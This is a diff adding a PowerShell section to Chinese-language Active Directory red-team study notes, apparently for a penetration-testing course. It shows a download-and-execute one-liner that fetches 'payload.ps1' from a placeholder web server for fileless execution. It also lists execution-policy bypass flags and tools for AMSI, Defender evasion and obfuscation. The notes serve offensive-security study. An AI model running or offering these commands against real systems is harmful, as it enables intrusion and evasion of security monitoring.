@@ -246,10 +246,92 @@ Enterprise Admins 群組擁有整個 Forest 層級的最高權限。
 
 ---
 
-Powershell 
+PowerShell 基礎操作 : 
+
+載入 AD 模組
+
+```bash=
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+Get-Command -Module ActiveDirectory
+```
+
+用途：
+- 使用 AD 相關 cmdlet
+- 進行 Domain Enumeration
+
+遠端下載並執行腳本（常見 red team 手法）
+
+```bash=
+iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
+```
+
+概念：
+- 記憶體載入（fileless execution）
+- 不落地執行腳本
+
+PowerShell 監控機制（Detection Surface）
+
+理解防禦面，才能理解攻擊面。
+
+系統層監控
+- System-wide transcription
+  - 記錄整個 PowerShell 操作過程
+
+- Script Block Logging
+  - 記錄完整 script 內容
+
+- AMSI (AntiMalware Scan Interface)
+  - 將腳本內容送給 AV 掃描
+
+- Constrained Language Mode (CLM)
+  - 限制 PowerShell 功能
+  - 通常搭配 AppLocker / WDAC
+
+Execution Policy（執行限制）
+
+常見參數 :
+
+```bash= 
+powershell -ep bypass
+powershell -c <cmd>
+powershell -encodedcommand <base64>
+$env:PSExecutionPolicyPreference="bypass"
+```
+重點理解：
+- Execution Policy 不是安全邊界
+- 真正的限制來自 AMSI / CLM / AV
+
+AV / AMSI 相關研究工具
+常見研究工具：
+  - AMSITrigger
+    - 測試哪段程式碼被 AMSI 觸發
+  - DefenderCheck
+    - 測試哪段內容被 Defender 標記
+  - Invoke-Obfuscation
+    - PowerShell 程式碼混淆框架
+
+.NET Offensive Tradecraft
+
+PowerShell 本質是 .NET。
+
+紅隊會：
+- 直接寫 C# 工具
+- 用 .NET API 操作 LDAP
+- 避免明顯 PowerShell artifact
+
+常見概念：
+- Source Code Obfuscation
+- 編譯後 payload 混淆
+- 降低 signature 命中率
+
+常見 .NET 混淆工具
+- ConfuserEx
+- Codecepticon（各種 PoC 與混淆實驗）
 
 ---
 
+
+---
 
 ### Module 2 
 - Local Privilege Escalation
